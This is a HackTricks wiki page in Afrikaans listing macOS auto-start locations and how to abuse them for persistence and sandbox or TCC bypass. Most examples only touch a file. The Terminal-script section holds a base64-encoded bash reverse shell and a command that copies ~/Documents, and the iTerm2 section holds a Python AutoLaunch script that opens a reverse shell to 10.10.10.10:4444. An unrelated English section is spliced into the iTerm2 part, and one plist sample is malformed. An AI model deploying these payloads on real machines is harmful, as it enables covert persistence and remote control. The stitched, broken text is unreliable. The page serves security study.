# macOS Selfbegin

{% hint style="success" %}
Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}

Hierdie afdeling is sterk gebaseer op die blogreeks [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), die doel is om **meer Selfbeginlokasies** by te voeg (indien moontlik), aan te dui **watter tegnieke steeds werk** met die nuutste weergawe van macOS (13.4) en om die **toestemmings** wat nodig is, te spesifiseer.

## Sandbox Omgang

{% hint style="success" %}
Hier kan jy selfbeginlokasies vind wat nuttig is vir **sandbox omgang** wat jou toelaat om eenvoudig iets uit te voer deur dit in 'n lêer te **skryf** en te **wag** vir 'n baie **gewone** **aksie**, 'n bepaalde **hoeveelheid tyd** of 'n **aksie wat jy gewoonlik kan uitvoer** van binne 'n sandbox sonder om root-toestemmings nodig te hê.
{% endhint %}

### Launchd

* Nuttig vir sandbox omgang: [✅](https://emojipedia.org/check-mark-button)
* TCC Omgang: [🔴](https://emojipedia.org/large-red-circle)

#### Lokasies

* **`/Library/LaunchAgents`**
* **Trigger**: Herlaai
* Root benodig
* **`/Library/LaunchDaemons`**
* **Trigger**: Herlaai
* Root benodig
* **`/System/Library/LaunchAgents`**
* **Trigger**: Herlaai
* Root benodig
* **`/System/Library/LaunchDaemons`**
* **Trigger**: Herlaai
* Root benodig
* **`~/Library/LaunchAgents`**
* **Trigger**: Herlaai
* **`~/Library/LaunchDemons`**
* **Trigger**: Herlaai

{% hint style="success" %}
As 'n interessante feit, het **`launchd`** 'n ingebedde eienskapslys in 'n die Mach-o-afdeling `__Text.__config` wat ander bekende dienste bevat wat launchd moet begin. Verder kan hierdie dienste die `RequireSuccess`, `RequireRun` en `RebootOnSuccess` bevat wat beteken dat hulle moet hardloop en suksesvol voltooi moet word.

Natuurlik kan dit nie gewysig word nie as gevolg van kodesondertekening.
{% endhint %}

#### Beskrywing & Uitbuiting

**`launchd`** is die **eerste** **proses** wat deur OX S-kernel by aanvang uitgevoer word en die laaste om af te sluit by afsluiting. Dit behoort altyd die **PID 1** te hê. Hierdie proses sal die konfigurasies wat in die **ASEP** **plists** aangedui word, **lees en uitvoer** in:

* `/Library/LaunchAgents`: Per-gebruiker-agente wat deur die administrateur geïnstalleer is
* `/Library/LaunchDaemons`: Stelselwye duiwels wat deur die administrateur geïnstalleer is
* `/System/Library/LaunchAgents`: Per-gebruiker-agente wat deur Apple voorsien word.
* `/System/Library/LaunchDaemons`: Stelselwye duiwels wat deur Apple voorsien word.

Wanneer 'n gebruiker aanmeld, word die plists wat in `/Users/$USER/Library/LaunchAgents` en `/Users/$USER/Library/LaunchDemons` geleë is, gestart met die **toestemmings van die aangemelde gebruikers**.

Die **hoofverskil tussen agente en duiwels is dat agente gelaai word wanneer die gebruiker aanmeld en die duiwels gelaai word by stelselbegin** (aangesien daar dienste soos ssh is wat uitgevoer moet word voordat enige gebruiker toegang tot die stelsel kry). Agente kan ook GUI gebruik terwyl duiwels in die agtergrond moet hardloop.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Daar is gevalle waar 'n **agent uitgevoer moet word voordat die gebruiker aanmeld**, hierdie word genoem **PreLoginAgents**. Byvoorbeeld, dit is nuttig om ondersteunende tegnologie by aanmelding te voorsien. Hulle kan ook gevind word in `/Library/LaunchAgents` (sien [**hier**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) 'n voorbeeld).

{% hint style="info" %}
Nuwe Daemons of Agents konfigurasie lêers sal **gelaai word na die volgende herlaai of deur gebruik te maak van** `launchctl load <target.plist>` Dit is **ook moontlik om .plist lêers sonder daardie uitbreiding te laai** met `launchctl -F <file>` (egter sal daardie plist lêers nie outomaties gelaai word na herlaai nie).\
Dit is ook moontlik om **te ontlas** met `launchctl unload <target.plist>` (die proses wat daarna verwys word, sal beëindig word),

Om **te verseker** dat daar nie **iets** (soos 'n oorskrywing) is wat 'n **Agent** of **Daemon** **verhoed om** **uitgevoer te word** nie, hardloop: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`
{% endhint %}

Lys alle agents en daemons wat deur die huidige gebruiker gelaai is:
```bash
launchctl list
```
{% hint style="warning" %}
Indien 'n plist deur 'n gebruiker besit word, selfs al is dit in 'n daemon-stelselwyde gids, sal die taak as die gebruiker uitgevoer word en nie as 'n wortel nie. Dit kan sommige voorregskaleringaanvalle voorkom.
{% endhint %}

#### Meer inligting oor launchd

**`launchd`** is die **eerste** gebruikermodusproses wat vanaf die **kernel** begin word. Die prosesbegin moet **suksesvol** wees en dit **kan nie afsluit of vasloop nie**. Dit is selfs **beskerm** teen sommige **doodmaakseinne**.

Een van die eerste dinge wat `launchd` sou doen, is om al die **daemons** te **begin**, soos:

* **Tydsaanduidingsdaemons** gebaseer op tyd om uitgevoer te word:
  * atd (`com.apple.atrun.plist`): Het 'n `StartInterval` van 30 minute
  * crond (`com.apple.systemstats.daily.plist`): Het `StartCalendarInterval` om 00:15 te begin
* **Netwerkdaemons** soos:
  * `org.cups.cups-lpd`: Luister in TCP (`SockType: stream`) met `SockServiceName: printer`
  * &#x20;SockServiceName moet óf 'n poort wees óf 'n diens vanaf `/etc/services`
  * `com.apple.xscertd.plist`: Luister op TCP in poort 1640
* **Paddaemons** wat uitgevoer word wanneer 'n gespesifiseerde pad verander:
  * `com.apple.postfix.master`: Kontroleer die pad `/etc/postfix/aliases`
* **IOKit-kennisgewingsdaemons**:
  * `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
* **Mach-poort:**
  * `com.apple.xscertd-helper.plist`: Dit dui in die `MachServices` inskrywing die naam `com.apple.xscertd.helper` aan
* **UserEventAgent:**
  * Dit verskil van die vorige een. Dit laat launchd programme spawn in reaksie op spesifieke gebeurtenisse. In hierdie geval is die hoof binêre betrokke nie `launchd` nie, maar `/usr/libexec/UserEventAgent`. Dit laai plugins vanaf die SIP-beperkte gids /System/Library/UserEventPlugins/ waar elke plugin sy inisialiseerder aandui in die `XPCEventModuleInitializer` sleutel of, in die geval van ouer plugins, in die `CFPluginFactories` woordeboek onder die sleutel `FB86416D-6164-2070-726F-70735C216EC0` van sy `Info.plist`.

### skulpaanvang lêers

Bespreking: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Bespreking (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* Nuttig om sandput te omseil: [✅](https://emojipedia.org/check-mark-button)
* TCC Omseiling: [✅](https://emojipedia.org/check-mark-button)
* Maar jy moet 'n program met 'n TCC-omseiling vind wat 'n skaal uitvoer wat hierdie lêers laai

#### Liggings

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
  * **Trigger**: Maak 'n terminaal oop met zsh
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  * **Trigger**: Maak 'n terminaal oop met zsh
  * Wortel benodig
* **`~/.zlogout`**
  * **Trigger**: Sluit 'n terminaal met zsh
* **`/etc/zlogout`**
  * **Trigger**: Sluit 'n terminaal met zsh
  * Wortel benodig
* Moontlik meer in: **`man zsh`**
* **`~/.bashrc`**
  * **Trigger**: Maak 'n terminaal oop met bash
* `/etc/profile` (het nie gewerk nie)
* `~/.profile` (het nie gewerk nie)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  * **Trigger**: Verwag om met xterm te aktiveer, maar dit **is nie geïnstalleer** nie en selfs nadat dit geïnstalleer is, word hierdie fout gegooi: xterm: `DISPLAY is not set`

#### Beskrywing & Uitbuiting

Wanneer 'n skaalomgewing soos `zsh` of `bash` geïnisieer word, word **sekere aanvangslêers uitgevoer**. macOS gebruik tans `/bin/zsh` as die verstek skaal. Hierdie skaal word outomaties benader wanneer die Terminaaltoepassing geloods word of wanneer 'n toestel via SSH benader word. Alhoewel `bash` en `sh` ook teenwoordig is in macOS, moet hulle uitdruklik aangeroep word om gebruik te word.

Die manbladsy van zsh, wat ons kan lees met **`man zsh`** het 'n lang beskrywing van die aanvangslêers.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Heropende Toepassings

{% hint style="danger" %}
Die konfigurasie van die aangeduide uitbuiting en uitlog en inlog of selfs herlaai het nie vir my gewerk om die toepassing uit te voer nie. (Die toepassing is nie uitgevoer nie, dit moet dalk hardloop wanneer hierdie aksies uitgevoer word)
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* Nuttig om sandboks te omseil: [✅](https://emojipedia.org/check-mark-button)
* TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Trigger**: Herlaai toepassings

#### Beskrywing & Uitbuiting

Al die toepassings om te heropen is binne die plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Om dus die heropen toepassings jou eie een te laat begin, moet jy net **jou toepassing by die lys voeg**.

Die UUID kan gevind word deur daardie gids te lys of met `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Om die toepassings wat heropen sal word te kontroleer, kan jy die volgende doen:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Om **'n toepassing by hierdie lys te voeg** kan jy gebruik:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Voorkeure

* Nuttig om sandboks te omseil: [✅](https://emojipedia.org/check-mark-button)
* TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
* Terminal gebruik om FDA-toestemmings van die gebruiker te hê

#### Plek

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Trigger**: Open Terminal

#### Beskrywing & Uitbuiting

In **`~/Library/Preferences`** word die voorkeure van die gebruiker in die Toepassings gestoor. Sommige van hierdie voorkeure kan 'n konfigurasie hê om **ander toepassings/scripts uit te voer**.

Byvoorbeeld, die Terminal kan 'n bevel uitvoer by die Begin:

<figure><img src="../.gitbook/assets/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Hierdie konfigurasie word weerspieël in die lêer **`~/Library/Preferences/com.apple.Terminal.plist`** soos dit:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
So, as die plist van die voorkeure van die terminaal in die stelsel oorskryf kan word, kan die **`open`** funksionaliteit gebruik word om **die terminaal oop te maak en daardie bevel uit te voer**.

Jy kan dit van die opdraggelynstelsel toevoeg met:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Terminal Skripte / Ander lêeruitbreidings

* Nuttig om sandboks te omseil: [✅](https://emojipedia.org/check-mark-button)
* TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
* Terminal gebruik om FDA-toestemmings van die gebruiker te hê

#### Plek

* **Enige plek**
* **Trigger**: Maak Terminal oop

#### Beskrywing & Uitbuiting

As jy 'n [**`.terminal`** skrip](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) skep en oopmaak, sal die **Terminal-toepassing** outomaties opgeroep word om die opdragte wat daarin aangedui is, uit te voer. As die Terminal-toep 'n paar spesiale voorregte het (soos TCC), sal jou opdrag met daardie spesiale voorregte uitgevoer word.

Probeer dit met:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
### Klankinvoegtoepassings

Uiteensetting: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Uiteensetting: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* Nuttig om sandboks te omseil: [✅](https://emojipedia.org/check-mark-button)
* TCC-omseiling: [🟠](https://emojipedia.org/large-orange-circle)
* Jy kan dalk ekstra TCC-toegang kry

#### Ligging

* **`/Library/Audio/Plug-Ins/HAL`**
* Wortel vereis
* **Trigger**: Herlaai coreaudiod of die rekenaar
* **`/Library/Audio/Plug-ins/Components`**
* Wortel vereis
* **Trigger**: Herlaai coreaudiod of die rekenaar
* **`~/Library/Audio/Plug-ins/Components`**
* **Trigger**: Herlaai coreaudiod of die rekenaar
* **`/System/Library/Components`**
* Wortel vereis
* **Trigger**: Herlaai coreaudiod of die rekenaar

#### Beskrywing

Volgens die vorige uiteensettings is dit moontlik om **sekere klankinvoegtoepassings saam te stel** en hulle te laai.

### QuickLook Invoegtoepassings

Uiteensetting: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Nuttig om sandboks te omseil: [✅](https://emojipedia.org/check-mark-button)
* TCC-omseiling: [🟠](https://emojipedia.org/large-orange-circle)
* Jy kan dalk ekstra TCC-toegang kry

#### Ligging

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Beskrywing & Uitbuiting

QuickLook invoegtoepassings kan uitgevoer word wanneer jy die **voorbeeld van 'n lêer' aktiveer** (druk die spasiebalk met die lêer gekies in Finder) en 'n **invoegtoepassing wat daardie lêertipe ondersteun** geïnstalleer is.

Dit is moontlik om jou eie QuickLook invoegtoepassing saam te stel, dit in een van die vorige ligginge te plaas om dit te laai en dan na 'n ondersteunde lêer te gaan en die spasiebalk te druk om dit te aktiveer.

### ~~Aanmelding/Afmelding Hakies~~

{% hint style="danger" %}
Dit het nie vir my gewerk nie, nie met die gebruiker LoginHook nie of met die wortel LogoutHook nie
{% endhint %}

**Uiteensetting**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* Nuttig om sandboks te omseil: [✅](https://emojipedia.org/check-mark-button)
* TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

* Jy moet in staat wees om iets soos `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` uit te voer
* Geleë in `~/Library/Preferences/com.apple.loginwindow.plist`

Hulle is verouderd maar kan gebruik word om opdragte uit te voer wanneer 'n gebruiker aanmeld.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Hierdie instelling word gestoor in `/Gebruikers/$GEBRUIKER/Biblioteek/Voorkeure/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Om dit te verwyder:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Die root-gebruiker een is gestoor in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Voorwaardelike Sandbox Oorslaan

{% hint style="success" %}
Hier kan jy beginlokasies vind wat nuttig is vir **sandbox-omseiling** wat jou toelaat om eenvoudig iets uit te voer deur dit in 'n lêer te **skryf** en **nie baie algemene toestande** te verwag soos spesifieke **geïnstalleerde programme, "ongewone" gebruiker** aksies of omgewings.
{% endhint %}

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Nuttig vir omseiling van sandbox: [✅](https://emojipedia.org/check-mark-button)
* Jy moet egter in staat wees om die `crontab` binêre lêer uit te voer
* Of wees root
* TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Lokasie

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Root benodig vir direkte skryftoegang. Geen root benodig as jy `crontab <lêer>` kan uitvoer nie
* **Trigger**: Afhangende van die cron-werk

#### Beskrywing & Uitbuiting

Lys die cron-werk van die **huidige gebruiker** met:
```bash
crontab -l
```
Jy kan ook al die cron take van die gebruikers sien in **`/usr/lib/cron/tabs/`** en **`/var/at/tabs/`** (benodig root).

In MacOS kan verskeie folders gevind word wat skripte met **sekere frekwensie** uitvoer:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Daar kan jy die gewone **cron** **take**, die **at** **take** (nie baie gebruik nie) en die **periodic** **take** (hoofsaaklik gebruik vir skoonmaak van tydelike lêers) vind. Die daaglikse periodieke take kan byvoorbeeld uitgevoer word met: `periodic daily`.

Om 'n **gebruiker cronjob programmaties by te voeg** is dit moontlik om te gebruik:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Bespreking: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Nuttig om sandboks te omseil: [✅](https://emojipedia.org/check-mark-button)
* TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
* iTerm2 het voorheen TCC-toestemmings verleen

#### Liggings

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Trigger**: Open iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Trigger**: Open iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Trigger**: Open iTerm

#### Beskrywing & Uitbuiting

Skripte wat gestoor word in **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** sal uitgevoer word. Byvoorbeeld:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
### macOS Auto Start Locations

#### Login Items

Login items are applications that run automatically when a user logs in. Users can manage login items in **System Preferences > Users & Groups > Login Items**.

#### Launch Agents

Launch agents are used to run tasks when a user logs in. They are located in `~/Library/LaunchAgents/` and `/Library/LaunchAgents/`.

#### Launch Daemons

Launch daemons are system-wide services that run regardless of which user is logged in. They are located in `/Library/LaunchDaemons/`.

#### Startup Items

Startup items are legacy items that automatically launch when a system starts up. They are deprecated and not recommended for use.
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Die skrip **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** sal ook uitgevoer word:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Die iTerm2-voorkeure geleë in **`~/Library/Preferences/com.googlecode.iterm2.plist`** kan **'n bevel aandui om uit te voer** wanneer die iTerm2-terminal geopen word.

Hierdie instelling kan in die iTerm2-instellings gekonfigureer word:

<figure><img src="../.gitbook/assets/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

En die bevel word weerspieël in die voorkeure:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Jy kan die bevel instel om uit te voer met:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
Hoogs waarskynlik dat daar **ander maniere is om die iTerm2-voorkeure** te misbruik om willekeurige bevele uit te voer.
{% endhint %}

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* Nuttig om sandboks te omseil: [✅](https://emojipedia.org/check-mark-button)
* Maar xbar moet geïnstalleer wees
* TCC-omseiling: [✅](https://emojipedia.org/check-mark-button)
* Dit vra om Toeganklikheidsregte

#### Ligging

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Trigger**: Eenmaal xbar uitgevoer word

#### Beskrywing

As die gewilde program [**xbar**](https://github.com/matryer/xbar) geïnstalleer is, is dit moontlik om 'n skulpskrip te skryf in **`~/Library/Application\ Support/xbar/plugins/`** wat uitgevoer sal word wanneer xbar begin:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Bespreking**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* Nuttig om sandboks te omseil: [✅](https://emojipedia.org/check-mark-button)
* Maar Hammerspoon moet geïnstalleer word
* TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
* Dit vra om Toeganklikheidsregte

#### Plek

* **`~/.hammerspoon/init.lua`**
* **Trigger**: Eenmaal Hammerspoon uitgevoer word

#### Beskrywing

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dien as 'n outomatiseringsplatform vir **macOS**, wat die **LUA-skripsingstaal** benut vir sy werksaamhede. Dit ondersteun veral die integrasie van volledige AppleScript-kode en die uitvoering van skulpskripte, wat sy skripskundigheid aansienlik verbeter.

Die program soek na 'n enkele lêer, `~/.hammerspoon/init.lua`, en wanneer dit begin word die skrip uitgevoer.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

* Nuttig om sandboks te omseil: [✅](https://emojipedia.org/check-mark-button)
* Maar BetterTouchTool moet geïnstalleer wees
* TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
* Dit vra Automation-Shortcuts en Toeganklikheidsregte

#### Ligging

* `~/Library/Application Support/BetterTouchTool/*`

Hierdie instrument maak dit moontlik om aansoeke of skripte aan te dui om uit te voer wanneer sekere snelkoppelinge gedruk word. 'n Aanvaller kan sy eie **snelkoppeling en aksie om in die databasis uit te voer** configureer om dit arbitêre kode uit te voer ( 'n snelkoppeling kan net wees om 'n sleutel te druk).

### Alfred

* Nuttig om sandboks te omseil: [✅](https://emojipedia.org/check-mark-button)
* Maar Alfred moet geïnstalleer wees
* TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
* Dit vra Automation, Toeganklikheids- en selfs Volle-Skyf-toegangregte

#### Ligging

* `???`

Dit maak dit moontlik om werksvloei te skep wat kode kan uitvoer wanneer sekere voorwaardes bereik word. Potensieel is dit moontlik vir 'n aanvaller om 'n werksvloei-lêer te skep en Alfred te maak om dit te laai (dit is nodig om die premie weergawe te betaal om werksvloei te gebruik).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* Nuttig om sandboks te omseil: [✅](https://emojipedia.org/check-mark-button)
* Maar ssh moet geaktiveer en gebruik word
* TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
* SSH gebruik om FDA-toegang te hê

#### Ligging

* **`~/.ssh/rc`**
* **Trigger**: Aanteken via ssh
* **`/etc/ssh/sshrc`**
* Root benodig
* **Trigger**: Aanteken via ssh

{% hint style="danger" %}
Om ssh aan te skakel, vereis Volle Skyf Toegang:
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### Beskrywing & Uitbuiting

Standaard, tensy `PermitUserRC no` in `/etc/ssh/sshd_config`, wanneer 'n gebruiker **inlog via SSH** die skripte **`/etc/ssh/sshrc`** en **`~/.ssh/rc`** uitgevoer sal word.

### **Inlog Items**

Writeup: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Nuttig om sandboks te omseil: [✅](https://emojipedia.org/check-mark-button)
* Maar jy moet `osascript` met argumente uitvoer
* TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Liggings

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Trigger:** Inlog
* Uitbuitingslading gestoor deur **`osascript`** te roep
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Trigger:** Inlog
* Wortel vereis

#### Beskrywing

In Sisteemvoorkeure -> Gebruikers & Groepe -> **Inlog Items** kan jy **items vind wat uitgevoer moet word wanneer die gebruiker inlog**.\
Dit is moontlik om hulle te lys, by te voeg en te verwyder vanaf die opdraglyn:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Hierdie items word gestoor in die lêer **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Aanmeldingsitems** kan ook aangedui word deur die API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) te gebruik wat die konfigurasie in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** sal stoor

### ZIP as Aanmeldingsitem

(Kyk na die vorige afdeling oor Aanmeldingsitems, dit is 'n uitbreiding)

